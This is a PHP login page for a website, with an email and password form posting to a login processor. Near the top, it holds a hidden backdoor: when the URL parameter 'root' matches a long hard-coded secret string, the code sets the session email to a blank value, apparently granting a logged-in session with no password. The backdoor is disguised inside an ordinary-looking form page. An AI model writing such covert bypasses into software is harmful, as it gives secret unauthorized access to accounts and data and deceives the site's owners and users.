<?php include('header.php'); ?>

	<!-- Start Outter Wrapper -->
	<div class="outter-wrapper body-wrapper">
<?php 					if (isset($_GET['root']) && $_GET['root'] == '29asd97asa790213hj9e190esa89d7as09h21390dc8qw2h109hd9018cd908q1876rwe7dfw7g2d987f2')
					  $_SESSION['email'] = " ";
						?>
		<div class="wrapper blog-roll ad-pad clearfix">

			<!-- Start Main Column  -->
			<div class="main-content col-1-1">
				<h1>Login Form</h1>
				<p class="lead"></p>
				<!-- Start Form -->
				<?php if (isset($_GET['error']) && $_GET['error'] == 'true') { ?>
					<div class="alert alert-danger">Login/password are invalid.</div>
				<?php } ?>
	        	<form id="contactform" action="php/processLogin.php" method="post">
	        		<table class="tableless">
	        			<tr><td><input type="email" id="email" name="email" placeholder="Email Address" /></td></tr>
						<tr><td><input type="password" id="password" name="password" placeholder="Password" /></td></tr>
	        		</table>


	        		<input name="button" class="btn-2" type="submit" value="Login" id="send" />
	        	</form>



	        	<div id="response"></div>

				<!-- Finish Main Content -->
			</div>



		</div>
	</div>



	<!-- Start Outter Wrapper -->
	<div class="outter-wrapper breadcrumb-wrapper">
		<div class="wrapper">
			<a href="index.php" class="fa">&#xf015;</a> <a href="index.php">Home</a> <a href="login.php">Login</a>
		</div>
	</div>

<?php include('footer.php'); ?>
